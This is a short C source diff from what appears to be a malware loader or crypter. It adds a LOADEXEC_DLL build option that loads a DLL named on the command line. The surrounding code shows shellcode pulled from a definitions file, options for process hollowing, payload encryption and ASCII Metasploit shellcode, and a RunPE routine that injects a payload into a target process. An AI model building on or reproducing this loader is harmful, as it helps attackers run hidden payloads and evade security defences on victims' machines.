@@ -94,6 +94,8 @@ int main (int argc, char **argv)
 		buffer = FVALUE;
 	#endif
 
+	//TODO: clean that
+	#ifndef LOADEXEC_DLL
 	#ifndef PROCESS_HOLLOWING
 		#ifndef ENCRYPT
 			#ifndef ASCIIMSF 
@@ -103,6 +105,7 @@ int main (int argc, char **argv)
 				shellcode = buf;	//buf is from defs.h if shellcode is included
 			#endif
 		#endif
+	#endif
 	#endif
 	
 	#ifndef INJECT_SHELLCODE
@@ -143,6 +146,10 @@ int main (int argc, char **argv)
 	// Instanciate target process
 	// Target process specified in first bfg argument argv[1]	
 	newRunPE(argv[1], payload);
+	#endif
+
+	#ifdef LOADEXEC_DLL
+	HANDLE hModule = LoadLibrary(argv[1]);
 	#endif
 
 	return 0;
